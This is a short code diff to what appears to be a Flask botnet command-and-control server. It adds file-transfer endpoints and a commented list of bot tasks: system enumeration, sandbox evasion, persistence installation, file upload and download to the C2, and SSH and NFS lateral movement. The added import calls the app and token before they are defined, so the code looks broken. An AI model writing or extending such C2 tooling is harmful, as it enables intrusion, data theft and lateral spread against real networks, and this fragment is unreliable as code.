@@ -29,6 +29,8 @@ import base64
 import hashlib
 import threading
 import time
+from file_transfer import add_file_transfer_endpoints
+add_file_transfer_endpoints(app, auth_token=AUTH_TOKEN)
 from datetime import datetime
 from queue import Queue
 from flask import Flask, request, jsonify
@@ -229,6 +231,15 @@ def push_task():
     All fields present in the request body are passed through to the task dict
     so bots always receive the full parameterisation the operator intended.
     """
+    #   "system_profile"  — triggers full system enumeration (T1082/T1016/T1033)
+    #   "sandbox_check"   — runs sandbox detection before payload
+    #   "plant_persist"   — installs persistence (method in task body)
+    #   "remove_persist"  — removes persistence
+    #   "upload_file"     — bot uploads file to C2
+    #   "download_file"   — bot downloads file from C2
+    #   "lateral_ssh"     — SSH jump chain lateral movement
+    #   "lateral_nfs"     — NFS share taint
+    
     data   = request.get_json()
     bot_id = data.get("bot_id", "all")
 
